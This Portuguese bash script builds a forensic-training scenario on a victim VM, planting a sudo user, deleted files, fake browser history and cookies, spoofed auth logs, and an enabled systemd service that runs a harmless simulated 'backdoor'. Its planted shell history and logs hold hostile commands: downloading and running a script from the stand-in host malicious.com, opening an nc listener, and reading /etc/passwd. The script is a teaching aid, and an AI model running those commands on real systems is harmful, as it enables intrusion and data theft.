#!/bin/bash
# LABORATÓRIO FORENSE — CENÁRIO INVESTIGATIVO (VM VÍTIMA)
# Debian 12 (Xfce) — Rode como root
# Uso: sudo bash plantar_cenario.sh
# v2 (revisada): journal persistente ANTES dos logs, dependências
# tolerantes a falta de internet, idempotente.

set -euo pipefail

USUARIO="maria"
SENHA="SenhaForte2026!"
PASTA_USUARIO="/home/$USUARIO"
DATA_DOCS="2026-08-14 09:30:00"
DATA_SUSPEITO="2026-09-10 03:15:00"

VERDE='\033[0;32m'; AMARELO='\033[1;33m'; VERMELHO='\033[0;31m'; RESET='\033[0m'
ok()   { echo -e "${VERDE}[+]${RESET} $1"; }
info() { echo -e "${AMARELO}[*]${RESET} $1"; }
erro() { echo -e "${VERMELHO}[!]${RESET} $1"; }

if [[ $EUID -ne 0 ]]; then
    erro "Execute como root: sudo bash $0"
    exit 1
fi

info "Iniciando plantio do cenário investigativo..."

# 1. DEPENDÊNCIAS (formato binário:pacote)
info "Verificando dependências..."
DEPENDS=("sqlite3:sqlite3" "curl:curl" "wget:wget" "convert:imagemagick" "sudo:sudo" "rsyslogd:rsyslog")
FALTANDO_PKGS=()
for par in "${DEPENDS[@]}"; do
    bin="${par%%:*}"
    pkg="${par##*:}"
    command -v "$bin" >/dev/null 2>&1 || FALTANDO_PKGS+=("$pkg")
done
if [[ ${#FALTANDO_PKGS[@]} -gt 0 ]]; then
    info "Instalando: ${FALTANDO_PKGS[*]}"
    apt-get update -qq || erro "apt-get update falhou (sem internet?) — seguindo com o que já existe."
    apt-get install -y -qq "${FALTANDO_PKGS[@]}" || erro "Alguns pacotes não instalaram — o script segue com fallbacks."
fi
ok "Dependências verificadas."

# 2. JOURNAL PERSISTENTE — ANTES de qualquer log!
info "Ativando journal persistente..."
if [[ ! -d /var/log/journal ]]; then
    mkdir -p /var/log/journal
    systemd-tmpfiles --create --prefix /var/log/journal 2>/dev/null || true
    systemctl restart systemd-journald 2>/dev/null || true
    sleep 1
    ok "Journal persistente ativado — logs sobreviverão ao reboot."
else
    ok "Journal já persistente."
fi

# 3. USUÁRIO VÍTIMA
info "Criando usuário '$USUARIO'..."
if ! id "$USUARIO" &>/dev/null; then
    useradd -m -s /bin/bash "$USUARIO"
    echo "$USUARIO:$SENHA" | chpasswd
    usermod -aG sudo "$USUARIO" 2>/dev/null || erro "Grupo sudo indisponível — Aula 10 ficará sem eventos sudo reais."
    ok "Usuário '$USUARIO' criado."
else
    info "Usuário já existe."
fi

# 4. ESTRUTURA DE DIRETÓRIOS
mkdir -p "$PASTA_USUARIO"/{Documentos,Downloads,Imagens,.config}
mkdir -p "$PASTA_USUARIO/Documentos/secretos"

# 5. DOCUMENTOS DE TRABALHO (Aulas 2, 3, 12)
cat > "$PASTA_USUARIO/Documentos/relatorio_vendas.txt" <<'EOF'
Relatório de vendas - Q3
Total: R$ 45.000,00
Cliente: Empresa Alpha
Responsável: Maria
EOF

cat > "$PASTA_USUARIO/Documentos/credenciais_credito.txt" <<'EOF'
[CONFIDENCIAL]
Cartão: 5555 **** **** 1234
Validade: 08/28
Titular: Maria S.
EOF

cat > "$PASTA_USUARIO/Documentos/notas_pessoais.txt" <<'EOF'
Ideias para o projeto novo
- Migrar servidor para Debian
- Revisar senhas de acesso
- Falar com o João sobre o contrato
EOF

# 6. DOWNLOADS (Aulas 3, 7, 11)
if curl -fsSL -o "$PASTA_USUARIO/Downloads/instalador_legitimo.deb" \
    "https://deb.debian.org/debian/pool/main/h/hello/hello_2.10-3_amd64.deb"; then
    ok "Download legítimo baixado."
else
    info "Sem internet — criando placeholder do instalador."
    echo "placeholder" > "$PASTA_USUARIO/Downloads/instalador_legitimo.deb"
fi

# Binário "malicioso" SIMULADO (não é malware real)
cat > "$PASTA_USUARIO/Downloads/backdoor_update" <<'EOF'
#!/bin/bash
# Simulação de binário suspeito — APENAS TREINO
echo "Atualizando sistema..."
sleep 5
EOF
chmod +x "$PASTA_USUARIO/Downloads/backdoor_update"

# 7. IMAGENS REAIS (Aulas 3, 4, 7)
info "Criando imagens..."
if command -v convert >/dev/null 2>&1; then
    convert -size 800x600 gradient:blue-white "$PASTA_USUARIO/Imagens/foto_viagem.jpg"
    convert -size 400x400 xc:red "$PASTA_USUARIO/Imagens/avatar.png"
    ok "Imagens geradas com ImageMagick."
else
    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" \
        | base64 -d > "$PASTA_USUARIO/Imagens/foto_viagem.png"
    ok "Imagens placeholder criadas (ImageMagick indisponível)."
fi

# 8. ARQUIVOS QUE SERÃO DELETADOS (Aula 4 — recuperação)
info "Plantando arquivos deletados (recuperáveis)..."
cat > "$PASTA_USUARIO/Documentos/secretos/plano_negocio.txt" <<'EOF'
PLANO_EXPANSAO_SECRETO_2026
Expansão para 3 novas filiais
Orçamento: R$ 250.000,00
Parceiro: Grupo Omega
EOF

cat > "$PASTA_USUARIO/Documentos/secretos/relatorio_financeiro.pdf" <<'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj
trailer << /Root 1 0 R /Size 4 >>
%%EOF
EOF

if command -v convert >/dev/null 2>&1; then
    convert -size 400x400 xc:purple "$PASTA_USUARIO/Imagens/foto_confidencial.png"
else
    echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" \
        | base64 -d > "$PASTA_USUARIO/Imagens/foto_confidencial.png"
fi

rm -f "$PASTA_USUARIO/Documentos/secretos/plano_negocio.txt"
rm -f "$PASTA_USUARIO/Documentos/secretos/relatorio_financeiro.pdf"
rm -f "$PASTA_USUARIO/Imagens/foto_confidencial.png"
ok "Arquivos deletados plantados."

# 9. HISTÓRICO DE NAVEGADOR (SQLite real — Aula 7)
if command -v sqlite3 >/dev/null 2>&1; then
    info "Criando banco SQLite do navegador..."
    mkdir -p "$PASTA_USUARIO/.mozilla/firefox/abc123.default"
    DB="$PASTA_USUARIO/.mozilla/firefox/abc123.default/places.sqlite"
    DB_COOKIE="$PASTA_USUARIO/.mozilla/firefox/abc123.default/cookies.sqlite"
    rm -f "$DB" "$DB_COOKIE"

    sqlite3 "$DB" <<'SQL'
CREATE TABLE moz_places (
    id INTEGER PRIMARY KEY,
    url LONGVARCHAR,
    title LONGVARCHAR,
    rev_host LONGVARCHAR,
    visit_count INTEGER DEFAULT 0,
    hidden INTEGER DEFAULT 0 NOT NULL,
    typed INTEGER DEFAULT 0 NOT NULL,
    frecency INTEGER DEFAULT -1 NOT NULL,
    last_visit_date INTEGER,
    guid TEXT
);
CREATE TABLE moz_historyvisits (
    id INTEGER PRIMARY KEY,
    from_visit INTEGER,
    place_id INTEGER,
    visit_date INTEGER,
    visit_type INTEGER,
    session INTEGER
);
INSERT INTO moz_places (id,url,title,rev_host,visit_count,hidden,typed,frecency,last_visit_date,guid) VALUES
(1,'https://www.bancoexemplo.com.br/conta','Banco Exemplo - Conta','br.com.bancoexemplo.www',5,0,1,100,1789084800000000,'abc1'),
(2,'https://malicious.com/coletor-de-dados','Coletor de Dados','com.malicious',2,0,0,50,1789085000000000,'abc2'),
(3,'https://www.redesocial.com/feed','Rede Social','com.redesocial.www',8,0,0,80,1789085200000000,'abc3'),
(4,'https://www.google.com/search?q=como+esconder+arquivos','Google','com.google.www',1,0,0,20,1789085500000000,'abc4');
INSERT INTO moz_historyvisits (id,from_visit,place_id,visit_date,visit_type,session) VALUES
(1,0,1,1789084800000000,1,1),
(2,1,2,1789085000000000,1,1),
(3,2,3,1789085200000000,1,1),
(4,3,4,1789085500000000,1,1);
SQL
    ok "Histórico de navegador criado."

    sqlite3 "$DB_COOKIE" <<'SQL'
CREATE TABLE moz_cookies (
    id INTEGER PRIMARY KEY,
    originAttributes TEXT NOT NULL DEFAULT '',
    name TEXT,
    value TEXT,
    host TEXT,
    path TEXT,
    expiry INTEGER,
    lastAccessed INTEGER,
    creationTime INTEGER,
    isSecure INTEGER,
    isHttpOnly INTEGER
);
INSERT INTO moz_cookies (id,originAttributes,name,value,host,path,expiry,lastAccessed,creationTime,isSecure,isHttpOnly) VALUES
(1,'','session_id','a1b2c3d4e5','.bancoexemplo.com.br','/',2000000000,1789084800000000,1789084700000000,1,1),
(2,'','tracking','xyz789','guestbook.com','/',2000000000,1789085000000000,1789084900000000,0,0);
SQL
    ok "Cookies criados."
else
    erro "sqlite3 indisponível — bancos do navegador NÃO criados (Aula 7 afetada)."
fi

# 10. HISTÓRICO DE SHELL (Aulas 7, 11)
cat > "$PASTA_USUARIO/.bash_history" <<'EOF'
cd /tmp
wget http://malicious.com/coletor-de-dados/backdoor_update.sh
chmod +x backdoor_update.sh
./backdoor_update.sh
sudo apt install netcat
nc -lvp 4444
ls -la /home/maria/Documentos
cat /etc/passwd
EOF

# 11. LOGS DE AUTENTICAÇÃO (Aulas 5, 10)
info "Plantando logs de autenticação..."
for i in 1 2 3 4 5; do
    logger -p auth.notice "Failed password for $USUARIO from 203.0.113.$i port 51234 ssh2"
done
logger -p auth.notice "Accepted password for $USUARIO from 203.0.113.7 port 51240 ssh2"
logger -p auth.notice "sudo: $USUARIO : TTY=pts/0 ; COMMAND=/usr/bin/curl http://malicious.com/coletor-de-dados/backdoor_update.sh"
logger -p auth.notice "New session 5 of user $USUARIO."
ok "Logs de autenticação plantados."

# 12. SERVIÇO SUSPEITO (Aulas 9, 11)
info "Criando serviço suspeito..."
cat > /etc/systemd/system/update-service.service <<'EOF'
[Unit]
Description=Update Service
After=network.target

[Service]
ExecStart=/home/maria/Downloads/backdoor_update
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload 2>/dev/null || true
systemctl enable update-service.service 2>/dev/null || true
ok "Serviço suspeito registrado."

# 13. LOGS DE REDE E SISTEMA (Aulas 5, 8)
logger -p kern.notice "kernel: suspicious connection from 203.0.113.7 port 4444"
logger -p daemon.notice "sshd[1234]: Connection closed by authenticating user $USUARIO 203.0.113.7 port 51240"
logger -p cron.notice "CRON: $USUARIO ran /home/maria/Downloads/backdoor_update"

# 14. TIMESTAMPS (Aula 6 — linha do tempo)
info "Ajustando timestamps..."
touch -d "$DATA_DOCS" "$PASTA_USUARIO/Documentos/relatorio_vendas.txt"
touch -d "$DATA_DOCS" "$PASTA_USUARIO/Documentos/credenciais_credito.txt"
touch -d "$DATA_DOCS" "$PASTA_USUARIO/Documentos/notas_pessoais.txt"
touch -d "$DATA_SUSPEITO" "$PASTA_USUARIO/Downloads/backdoor_update"
touch -d "$DATA_SUSPEITO" "$PASTA_USUARIO/.bash_history"
ok "Timestamps ajustados."

# 15. PERMISSÕES
chown -R "$USUARIO:$USUARIO" "$PASTA_USUARIO"

# 16. RESUMO FINAL
echo ""
ok "Cenário plantado com sucesso!"
echo ""
echo "  Usuário vítima : $USUARIO (senha: $SENHA)"
echo "  Documentos     : $PASTA_USUARIO/Documentos"
echo "  Downloads      : $PASTA_USUARIO/Downloads"
echo "  Imagens        : $PASTA_USUARIO/Imagens"
echo "  Histórico      : $PASTA_USUARIO/.mozilla/firefox/abc123.default"
echo "  Serviço        : update-service.service"
echo ""
echo "  Próximo passo: desligue a VM (shutdown -h now) e"
echo "  colete o espelho na VM de análise (dd + sha256sum)."